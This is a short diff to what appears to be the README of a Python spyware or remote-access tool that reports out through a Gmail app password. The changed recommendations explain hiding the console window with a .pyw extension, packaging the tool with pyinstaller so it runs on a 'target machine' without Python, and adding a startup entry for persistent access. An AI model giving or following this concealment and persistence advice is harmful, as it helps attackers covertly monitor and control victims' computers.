@@ -12,6 +12,6 @@ Open <a href="https://myaccount.google.com/apppasswords?utm_source=google-accoun
 Press **Select App** then press pick any of your choosing then press **Generate**  <br />
 Copy the code and keep that tab open just in case then paste it into your **API Key** then it will work 
 ### Recommendations
-1. You should rename the file extension from **.py** to **.pyw**
+1. You should rename the file extension from **.py** to **.pyw** (This hides the terminal)
 2. Run it through **pyinstaller** to make it an exe so you **don't need python installed in the target machine**
 3. Make a startup file that boots up the exe or python file so you can always have access 
